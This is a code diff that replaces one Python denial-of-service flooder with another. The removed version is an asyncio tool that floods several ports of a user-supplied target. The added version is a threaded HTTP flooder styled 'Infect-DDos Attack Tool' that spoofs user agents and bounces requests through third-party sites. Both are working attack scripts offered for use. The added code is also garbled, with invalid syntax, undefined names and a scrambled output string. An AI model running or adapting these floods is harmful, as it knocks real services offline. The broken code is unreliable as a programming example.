@@ -1,119 +1,185 @@
-import asyncio
-import os
-import subprocess
-import socket
-from typing import Dict, Tuple
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
 
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
+from queue import Queue
+from optparse import OptionParser
+import time,sys,socket,threading,logging,urllib.request,random
 
-class CustomTCPProtocol(asyncio.Protocol):
-    def __init__(self):
-        self.queues: Dict[Tuple[str, int], asyncio.Queue] = {}
-        self.destinations: Dict[Tuple[str, int], Tuple[asyncio.Queue, asyncio.Semaphore]] = {}
-        self.transport = None
+def user_agent():
+    global uagent
+    uagent = []
 
-    def connection_made(self, transport):
-        self.transport = transport
+    for i in range(100):
+        uagent.append(
+            f"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14\n")
+        uagent.append(
+            f"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0\n")
+        uagent.append(
+            f"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\n")
+        uagent.append(
+            f"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\n")
+        uagent.append(
+            f"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7\n")
+        uagent.append(
+            f"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\n")
+        uagent.append(
+            f"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\n")
 
-    def data_received(self, data: bytes) -> None:
-        for dest in self.destinations.values():
-            dest[0].put_nowait(data)
 
-    def connection_lost(self, exc):
-        for dest in self.destinations.values():
-            dest[1].release()
-        self.destinations.clear()
+def my_bots():
+    global bots
+    bots = []
 
-    def add_destination(self, dest: Tuple[str, int]):
-        if dest not in self.destinations:
-            self.destinations[dest] = (asyncio.Queue(), asyncio.Semaphore())
+    for i in range(100):
+        bots.append(f"http://validator.w3.org/check?uri={i}")
+        bots.append(
+            f"http://www.facebook.com/sharer/sharer.php?u={i}")
+    return pants
 
-async def ping_target(target: str):
+
+def infecting(url):
+    try:
+        while True:
+            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
+            global address
+            print(f"\033[94m{address} \033[0m")
+            time.sleep(.1)
+    except:
+        time.sleep(.1)
+
+
+def infect_it(item):
+    try:
+        while True:
+            packet = str(f"GET {address} HTTP/1.1\nHost: &_&+\n\n{splus hairst.encoding('utf')}\n User-Agent: {random.choice(uagent)}\n").encode('utf-8')
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((address, int(port)))
+            if s.sendto(packet, (address, int(port))):
+                s.shutdown(1)
+                print(f"\033[92m {time.ctime(time.time())} &lt;--packet sent! infecting--&gt;\033[0m")
+            else:
+                s.shutdown(1)
+                print("\033[91mshut&lt;-&gt;down \033[0m")
+            time.sleep(.1)
+    except socket.error as e:
+        print(f"\033[91mno connection! server maybe down \033[0m")
+        # print('\033[91m', e, '\033[0m')
+        time.sleep(.1)
+
+
+def dos():
     while True:
-        os.system("clear")
-        try:
-            output = subprocess.check_output(["ping", "-c", "1", target], stderr=subprocess.STDOUT, universal_newlines=True)
-            print(f"{bcolors.OKBLUE}Ping successful: {output.split()[3]} ms{bcolors.ENDC}")
-        except subprocess.CalledProcessError:
-            print(f"{bcolors.FAIL}Ping failed. Target is not reachable.{bcolors.ENDC}")
-        await asyncio.sleep(1)
+        item = q.get()
+        infect_it(item)
+        q.task_done()
 
-async def attack(target: str, duration_minutes: int, attack_count: int, progress_queue: asyncio.Queue) -> None:
-    duration_seconds = duration_minutes * 60
-    tasks = []
 
-    async def attack_port(port: int):
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(1)
-                s.connect((target, port))
-                
-                if port == 80:
-                    s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
-                elif port == 443:
-                    s.send(b"POST / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
-                else:
-                    s.send(b"GET / HTTP/1.1\r\n\r\n")
-                
-                s.recv(1024)  
-                progress_queue.put_nowait(1)
+def dos2():
+    while True:
+        item = w.get()
+        infecting(random.choice(bots) + "http://" + address)
+        w.task_done()
 
-        except Exception:
-            pass
 
-    for _ in range(attack_count):
-        for port in [80, 443, 8080, 21, 22]:
-            tasks.append(asyncio.create_task(attack_port(port)))
+def usage():
+    print(
+        ''' \033[92m Infect-DDos Attack Tool v.1.0 
+1.0 
+the end user's responsibility to obey all applicable laws.
+1.0
+It is just for server testing script. Your ip is visible. 
+1.0
+usage : python3 hammer.py [-s] [-p] [-t]
+-h : help
+-s : server ip
+-p : port default 80
+-t : turbo default 135 
+1.0
+1.0 
+1.0
+''')
+    sys.exit()
 
-    await asyncio.wait(tasks)
 
-async def countdown(duration_seconds: int):
-    for remaining in range(duration_seconds, 0, -1):
-        mins, secs = divmod(remaining, 60)
-        timer = f"{mins:02}:{secs:02}"
-        print(f"\r{bcolors.HEADER}Time remaining: {timer}{bcolors.ENDC}", end="")
-        await asyncio.sleep(1)
-    print()
+def get_parameters():
+    global address
+    global port
+    global thro
+    global item
+    # 
+    optp = OptionParser(add_help_option=False, epilog="Hammers")
+    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const",
+                   dest="loglevel", const=logging.ERROR, default=logging.INFO)
+    optp.add_option("-s", "--server", dest="address", help="attack to server ip -s ip")
+    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
+    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
+    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
+    opts, args = optp.parse_args()
+    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
+    if opts.help:
+        usage()
+    if opts.address is not None:
+        address = opts.address
+    else:
+        usage()
+    if opts.port is None:
+        port = 80
+    else:
+        port = opts.port
+    if opts.thro is None:
+        thro = 135
+    else:
+        thro = opts.turbo
 
-async def loading_bar(progress_queue: asyncio.Queue, total_requests: int):
-    bar_length = 40
-    completed_requests = 0
 
-    while completed_requests < total_requests:
-        try:
-            completed_requests += await asyncio.wait_for(progress_queue.get(), timeout=1)
-        except asyncio.TimeoutError:
-            pass
+# reading headers
+global data
+headers = open("headers.txt", "r")
+data = headers.read()
+headers.close()
+#task queue are q,w
+q = Queue()
+w = Queue()
 
-        percent = completed_requests / total_requests
-        filled_length = int(bar_length * percent)
-        bar = '█' * filled_length + '-' * (bar_length - filled_length)
-        print(f"\r{bcolors.HEADER}Loading: |{bar}| {percent:.1%} Complete{bcolors.ENDC}", end="")
-    
-    print()
 
-async def main():
-    os.system('clear')
-    duration_minutes = int(input(f"{bcolors.HEADER}Enter the duration of the attack in minutes: {bcolors.ENDC}"))
-    target = input(f"{bcolors.HEADER}Enter the target IP or domain: {bcolors.ENDC}")
-    attack_count = int(input(f"{bcolors.HEADER}Enter the number of concurrent attack instances: {bcolors.ENDC}"))
-    
-    total_requests = attack_count * 5 * duration_minutes * 60
-    print(f"{bcolors.OKGREEN}Attacking {target} for {duration_minutes} minutes with {attack_count} instances...{bcolors.ENDC}")
+if __name__ == '__main__':
+    if len(sys.argv) < 2:
+        usage()
+    get_parameters()
 
-    progress_queue = asyncio.Queue()
-    await asyncio.gather(
-        attack(target, duration_minutes, attack_count, progress_queue),
-        ping_target(target),
-        countdown(duration_minutes * 60),
-        loading_bar(progress_queue, total_requests)
-    )
+    print(f"Infecting...\
+\0{address}\03\0\3\0\3\3\0\.0.0&.egerplonary\030genert.gyoleyp \
+\03ipotal:\03{port}\03((turaybo: \03{turbo}\030(usrurY_\])l.tant.am inip ',-/_-")
+    print(f"\033[92pplease wait...\033[0m")
+    user_agent()
+    my_bots()
+    time.sleep(5)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((address, int(port)))
+        s.settimeout(1)
+    except socket.error as e:
+        print(f"\033[91mcheck server ip and port\033[0m")
+        usage()
+    while True:
+        for i in range(int(thro)):
+            t = threading.Thread(target=dos)
+            t.daemon = True  # if thread is exist, it dies
+            t.start()
+            t2 = threading.Thread(target=dos2)
+            t2.daemon = True  # if thread is exist, it dies
+            t2.start()
 
-if __name__ == "__main__":
-    asyncio.run(main())
+        start = time.time()
+        #tasking
+        item = 0
+        while True:
+            if (item > 1800): 
+                item = 0
+                time.sleep(.1)
+            item = item + 1
+            q.put(item)
+            w.put(item)
+        q.join()
+        w.join()
+
